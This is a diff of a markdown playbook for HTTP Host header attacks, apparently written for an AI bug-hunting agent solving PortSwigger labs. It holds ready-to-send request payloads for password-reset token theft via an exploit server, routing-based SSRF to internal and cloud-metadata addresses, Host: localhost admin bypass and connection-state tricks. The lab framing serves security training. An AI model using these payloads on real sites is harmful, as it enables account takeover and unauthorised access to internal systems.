@@ -1,86 +1,104 @@
 # HTTP Host Header Attacks Methodology
-## Expert-Level Playbook for Autonomous Bug Hunting
+## Expert-Level Playbook (reset poisoning, cache, auth bypass, routing SSRF)
 
-> Apps that trust the `Host` (or `X-Forwarded-Host`) header can be steered into
-> password-reset poisoning, cache poisoning, routing-based SSRF, and auth bypass.
+> 5 PortSwigger labs. The app trusts the Host (or an override header) to build
+> absolute URLs, route requests, or gate access. Change one host-related header
+> at a time and diff behavior. Raw sending (`caido_local_api`/`burp_send_http1_request`)
+> lets you set duplicate/absolute-form hosts a normal client won't allow.
 
 ---
 
-## Phase 1: Detection & Fingerprinting
+## Phase 1: Probe host handling
 
-### 1.1 Probe Host Handling
+### 1.1 Baseline + tamper
 ```
-# Change the Host header and watch what breaks/reflects
-Host: evil.com
-Host: target.com:evil.com
-X-Forwarded-Host: evil.com
-X-Host: evil.com  /  X-Forwarded-Server: evil.com
+capture_baseline url=https://TARGET/
+# then vary, one at a time:
+Host: evil.test
+Host: TARGET          + X-Forwarded-Host: evil.test
+Host: TARGET          + X-Host: evil.test
+Host: TARGET          + X-Forwarded-Server: evil.test
+Host: TARGET:evil.test     (port confusion)
+Host: TARGET
+Host: evil.test            (duplicate Host)
+absolute-form: GET https://TARGET/ HTTP/1.1  + Host: evil.test
 ```
-- Does the value get reflected in links, redirects, or cached responses?
-- Does the app still serve 200 with an arbitrary Host? (weak validation)
+Check whether the injected host is reflected in the body (links, scripts,
+password-reset URLs) or changes routing/status.
 
-### 1.2 Duplicate / Ambiguous Host
+### 1.2 Override header discovery
+Brute the usual suspects with `burp_send_to_intruder` / `ffuf_fuzz`:
+`X-Forwarded-Host, X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded,
+X-Original-URL, X-Rewrite-URL, X-Forwarded-Scheme/Proto`.
+
+---
+
+## Phase 2: Exploitation per sub-variant
+
+| Sub-variant | Technique |
+|-------------|-----------|
+| Password reset poisoning | trigger reset; Host controls the reset link domain → victim clicks → token to attacker |
+| Web cache poisoning via Host | unkeyed `X-Forwarded-Host` reflected + cached (see cache_poisoning.md) |
+| Auth bypass via Host | admin panel gated by `Host: localhost`/internal name → set it |
+| Host header authentication bypass | override header trusted for "internal" access |
+| Routing-based SSRF | front-end routes by Host → point Host at an internal host/metadata |
+| Connection-state / first-request routing | reuse a keep-alive connection whose first request set a trusted Host |
+| SSRF via a malformed request line | absolute-form target + Host mismatch reaches internal service |
+
+### 2.1 Password reset poisoning
 ```
-Host: target.com
-Host: evil.com            (two Host headers)
-GET https://target.com/  HTTP/1.1  (absolute URL + Host)
-Host: target.com
- Host: evil.com           (indented / line-wrapped)
+POST /forgot-password HTTP/1.1
+Host: exploit-XXXX.exploit-server.net      (or X-Forwarded-Host: ...)
+
+username=carlos
 ```
+The emailed reset link points at your host; capture the token from the exploit
+server access log, then reset the victim's password.
+
+### 2.2 Routing-based SSRF
+```
+Host: 192.168.0.1            # front-end forwards to internal host
+Host: 169.254.169.254        # cloud metadata via routing
+```
+Confirm blind routing with `oob_get_domain`/`oob_poll`, then target the internal
+resource the lab requires.
+
+### 2.3 Auth bypass
+```
+GET /admin HTTP/1.1
+Host: localhost
+```
+Or set the override header the app trusts for "local"/internal requests.
+
+### 2.4 Connection-state attack
+Front-end validates the Host only on the first request of a connection; send a
+valid first request then a malicious second on the same keep-alive connection
+(`burp_send_http1_request`, disable connection reset).
 
 ---
 
-## Phase 2: Exploitation Techniques
+## Phase 3: Tooling
 
-### 2.1 Password Reset Poisoning
-- Trigger a reset for the victim while setting `X-Forwarded-Host: evil.com`.
-- The reset email's link points to `evil.com/reset?token=...`; when the victim
-  clicks, the token hits your server. Replay it to reset their password.
-
-### 2.2 Web Cache Poisoning via Host
-- If the Host feeds an unkeyed cached resource (e.g. an absolute script URL),
-  poison the cache so other users load `//evil.com/x.js` (see cache_poisoning.md).
-
-### 2.3 Routing-Based SSRF
-- If a front-end proxies to the back-end using the Host, set it to an internal
-  host (`192.168.0.1`, `169.254.169.254`) to reach internal services/metadata.
-
-### 2.4 Authentication / Access Bypass
-- Some apps grant admin only when accessed via an internal vhost:
-  `Host: localhost` or `Host: internal-admin` may expose `/admin`.
-
-### 2.5 Connection-State / Vhost Confusion
-- HTTP/2 `:authority` vs Host desync; connection reuse to smuggle a different
-  vhost past the front-end.
-
----
-
-## Phase 3: PortSwigger Lab-Specific Techniques
-- **Basic password reset poisoning**: `X-Forwarded-Host: exploit-server`.
-- **Host header authentication bypass**: `Host: localhost` reaches `/admin`.
-- **Web cache poisoning via ambiguous requests** / **routing-based SSRF**:
-  duplicate Host / absolute URL tricks to reach the admin or internal API.
-- **SSRF via a malformed request line**: `GET https://internal/ HTTP/1.1`.
-- **Host validation bypass via connection-state attack**: reuse a connection
-  whose first request had a valid Host.
-
----
-
-## Phase 4: Tools & Automation
-- Burp **Param Miner** ("Guess headers") to find supported host-override headers.
-- Repeater to mutate Host / duplicate it / try absolute request lines.
-- Exploit server to receive poisoned reset links.
-
----
+```
+http_request              # quick header tampering + reflection checks
+caido_local_api / burp_send_http1_request  # duplicate/absolute-form Host, keep-alive state
+capture_baseline / diff_against_baseline    # detect behavioral change
+oob_get_domain / oob_poll  # routing-based SSRF confirmation
+exploit_server             # capture poisoned reset-link tokens
+burp_send_to_intruder / ffuf_fuzz  # override-header discovery
+```
 
 ## Common Failure Modes & Solutions
+
 | Problem | Solution |
 |---------|----------|
-| Host strictly validated | Try `X-Forwarded-Host` / duplicate Host / absolute URI |
-| Reset link not poisoned | Look for a dangling-markup or referer leak instead |
-| No internal reach | Confirm a front-end proxy exists before routing SSRF |
+| Host validated | Try override headers, duplicate Host, absolute-form, port confusion |
+| Reset link not poisoned | Use `X-Forwarded-Host`; confirm which header builds the link |
+| Nothing reflected | Look for routing/auth effects, not just body reflection |
+| Client blocks bad Host | Use raw send (Caido/Burp), not curl/requests |
+| SSRF blind | Prove with OOB before targeting internal host |
 
-## Success Criteria
-- [ ] Poisoned a reset link, cache entry, or reached an internal/admin resource
-- [ ] Completed the account takeover / SSRF objective
-- [ ] Lab shows "solved"
+## Validation / Success Criteria
+- [ ] A host-controlled value reaches a sensitive sink (reset link, cache, route, auth).
+- [ ] Control request with the original Host does not reproduce the impact.
+- [ ] Lab solved banner or victim impact observed.
